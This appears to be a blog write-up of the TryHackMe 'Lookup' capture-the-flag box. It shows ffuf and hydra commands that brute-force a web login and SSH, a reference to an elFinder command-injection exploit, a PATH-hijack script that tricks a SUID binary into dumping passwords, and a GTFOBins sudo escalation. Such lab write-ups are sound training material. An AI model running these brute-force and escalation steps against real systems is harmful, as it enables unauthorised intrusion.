---
layout: post
title: Lookup (TryHackMe)
date: 2025-05-20
categories: [CTF, TryHackme]
tags: [login bruteforce, GTFObins, Look]
---

## Nmap Result

```nmap
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)

80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login Page
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

# Enumeration

## HTTP(80)

### Dirsearch


```
dirsearch -h http://lookup.thm

[14:33:07] 403 -  275B  - /.php                                             
[14:33:59] 200 -    1B  - /login.php                                        
[14:34:16] 403 -  275B  - /server-status                                    
[14:34:16] 403 -  275B  - /server-status/

```

## Website Features
- Login page

#### After we bruteforce we can find the password

```ffuf
ffuf -w /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt -X POST -u http://lookup.thm/login.php -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8 
```
![[Pasted image 20250207175024.png]]
![ffuf password ](https://c00lrabbit.github.io/assets/Images/Lookup/fuff-password.png)

But this password doesn't login
so i enumerated the username
```ffuf
 ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-username.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=password123' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8 
```
![[Pasted image 20250207175736.png]]
![ffuf uname](https://c00lrabbit.github.io/assets/Images/Lookup/fuff-uname.png)

- After we login with the correct credentials we get into `files.lookup.thm` vhost.
- There is a service running on this vhost named "elFinder".

![elfinder dashboard](https://c00lrabbit.github.io/assets/Images/Lookup/elfinder-hpage.png)

- Found the version of the elFinder

![elfinder version info](https://c00lrabbit.github.io/assets/Images/Lookup/elfinder-info.png)

# Exploitation

- This version is vulnerable to php command injection which leads to RCE.
- exploit-https://www.exploit-db.com/exploits/46481

![exploit](https://c00lrabbit.github.io/assets/Images/Lookup/exploit-shell.png)

We can upgrade this into interactive shell using Reverse shell.com
![[Pasted image 20250207185928.png]]

- After running linpeas we found a SUID
![[Pasted image 20250207191615.png]]

```
echo '#!/bin/bash' > id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
chmod +x id
/usr/sbin/pwm
```

- after running the above line we get this password
```password.txt
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171

```

- Using hydra we can bruteforce the login
```hydra
hydra -l think -P password.txt ssh://lookup.thm -t 40 -v
```
![[Pasted image 20250207193607.png]]

# Post Compromise 

- After running sudo -l we found that we have access to look with sudo
- After search in GTFO bins [Click Here](https://gtfobins.github.io/gtfobins/look/#sudo) we found a bypass
![[Pasted image 20250207194339.png]]